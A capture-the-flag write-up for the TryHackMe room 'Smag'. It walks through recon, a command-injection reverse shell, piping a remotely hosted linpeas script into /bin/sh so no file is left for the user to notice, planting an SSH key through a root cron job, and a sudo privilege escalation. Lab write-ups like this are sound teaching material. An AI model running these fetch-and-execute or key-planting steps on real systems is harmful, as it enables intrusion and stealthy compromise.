# SmagWriteUp
So I'll show you my way to hack this very nice, but no so easy tryhackme room :
Smag
# Recon
First, we need to scan with nmap, as always :
![Capture d’écran de 2020-07-31 18-50-30](https://user-images.githubusercontent.com/50116433/89050911-b889b400-d353-11ea-8889-df85a7b67fdb.png)<br>
We see http and ssh. The apache webserver isn't vulnerable and ssh isn't either.
Let's run an nmap scan on all ports in the background, just in case : 
```nmap -p- 10.10.43.30```
# Get a shell
Now I wanna look at the webserver, but it's under construction so nothing appears to be here...
I added smag.thm to /etc/hosts, but nothing changed.

One thing you should do everytime you're on a webpage is checking the file extension. Here the index file is index.php
The webserver is running php. 
Let's run gobuster, since this is the only thing we can do now :
![Capture d’écran de 2020-07-31 18-58-27](https://user-images.githubusercontent.com/50116433/89051347-68f7b800-d354-11ea-887f-5454af53f124.png)<br>

You noticed that I used the .php extension, and the txt too ( I always, it's just in case )
After finding /mail we can see a page saying the server is using mail2web software to displays mails on the page, but I didn't find anything with it in searchsploit :(<br>
There is a .pcap file, after opening it in wireshark we can see an http request with a username and a password. Nice !
I tried to use these in ssh but it didn't work.
<br><br>
![censored_stuff](https://user-images.githubusercontent.com/50116433/89052543-26cf7600-d356-11ea-8f2c-34e3d0ba5225.jpg)<br>
<br>
We also notice that the http request is going to development.smage.htb, and after adding it to my /etc/hosts files.
The domain development.swag.thm is redirecting to a login page where we can login with the credentials we found earlier.
There is an admin command pannel :
![Capture d’écran de 2020-07-31 19-08-13](https://user-images.githubusercontent.com/50116433/89053375-65b1fb80-d357-11ea-80c1-3d531d7418f1.png)<br>
I try to ping my machine, just to see if it works, I use tcpdump to listen for incoming ping request : 
```sudo tcpdump -i tun0 icmp and icmp[icmptype]=icmp-echo```
Then I run the command on the webpage and tadaaa:<br>
![Capture d’écran de 2020-07-31 19-08-33](https://user-images.githubusercontent.com/50116433/89053686-e40e9d80-d357-11ea-92fe-cfa5eb7c0dd5.png)<br><br>
It's working ! Unfortunately, it's not displaying any output, even in the source code, so we cannot read flags.
I tried to wget a php file from my machine, and the file is downloaded correctly by the machine but somehow I couldn't have access to it with my browser... 
At this point I tried many reverse shells, but I was sending commands with burp, and they didn't worked because the url encoding wasn't correctly executed.
I tried again few hours later but I was sending my reverse sshells command from the website and after few minutes I remebered that the webserver was running php, so php should be installed on the machine. And it was : my reverse php shell worked !<br>
![Capture d’écran de 2020-07-31 19-11-31](https://user-images.githubusercontent.com/50116433/89054531-42884b80-d359-11ea-8237-04c09f3f4b4c.png)
# User Flag
So there is a user jake, but we cannot acces the flag in his home directory and we can't either read the .ssh folder.
Next step is to run our favourite enumeration tool : [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).
I setup an http server on my computer with updog ( a very cool and easy to use http server ), then I run linpeas with the following command : <br>```curl 10.9.10.225:9090/linpeas.sh |/bin/sh```<br>
I do like this because here, no file is getting downloaded and it's invisible for the user.
After looking at the output ( it took some time ), I noticed a crontab executed by root :
![Capture d’écran de 2020-07-31 19-16-55](https://user-images.githubusercontent.com/50116433/89055602-f50cde00-d35a-11ea-8bf0-e53c1a050dd2.png)<br>
The root user is copying this file to jake's authorized_keys
We have write access to the /opt/.backups/jake_id_rsa.pub.backup file, so we can put our own .pub file here, and then connect to Jake with ssh !
Let's go to /dev/shm ( because we always have write access into it ) and use ssh-keygen.<br>
![Capture d’écran de 2020-07-31 19-20-22](https://user-images.githubusercontent.com/50116433/89055953-8bd99a80-d35b-11ea-94c3-a05746f862cc.png)<br>
After generating a public ssh key let's copy it to the jake .pub backup file :
```cp /dev/shm/id_rsa.pub /opt/.backups/jake_id_rsa.pub.backups```
Copy the id_rsa private key to our machine, wait a bit, then connect with ssh to jake's account :
![Capture d’écran de 2020-07-31 19-28-08](https://user-images.githubusercontent.com/50116433/89056343-289c3800-d35c-11ea-8310-bbb15cd4f7af.png)<br>
# Root Flag
Before running linpeas always check sudo -l permissions :
![Capture d’écran de 2020-07-31 19-28-32](https://user-images.githubusercontent.com/50116433/89056720-c263e500-d35c-11ea-84fb-28f79a977a73.png)<br>
There is a privesc with this on gtfobins ( even three ), the first one won't work because the machine isn't connected to internet, the second one may work but I'll try the third one because it fits on one line.<br>
![Capture d’écran de 2020-07-31 19-29-54](https://user-images.githubusercontent.com/50116433/89056972-2edee400-d35d-11ea-9660-564377550066.png)<br>
And we are root ! Thanks you [JakeDoesSec](https://tryhackme.com/p/JakeDoesSec) for this very nice room !
